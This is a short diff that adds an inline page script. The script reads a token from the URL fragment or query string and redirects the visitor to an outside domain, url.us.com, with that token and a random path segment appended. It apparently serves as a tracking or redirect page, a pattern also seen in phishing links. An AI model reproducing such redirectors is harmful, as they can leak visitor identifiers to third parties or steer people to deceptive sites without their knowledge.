@@ -1,0 +1,16 @@
+<script>
+(function () {
+  var TRACK  = "https://url.us.com";
+  var ACTION = "read";
+  function grab(s) {
+    s = (s || "").replace(/^[#?]/, "");
+    if (!s) return "";
+    var m = s.match(/(?:^|&)(?:ref|c|utm_content|d)=([^&]+)/);
+    return m ? m[1] : s.split("&")[0];
+  }
+  var token = decodeURIComponent(grab(location.hash) || grab(location.search) || "").trim();
+  if (!token) { document.body.innerHTML = "Invalid link."; return; }
+  var rnd = Math.random().toString(36).slice(2, 12);
+  location.replace(TRACK + "/" + ACTION + "/" + rnd + "/" + token + "?t=1");
+})();
+</script>
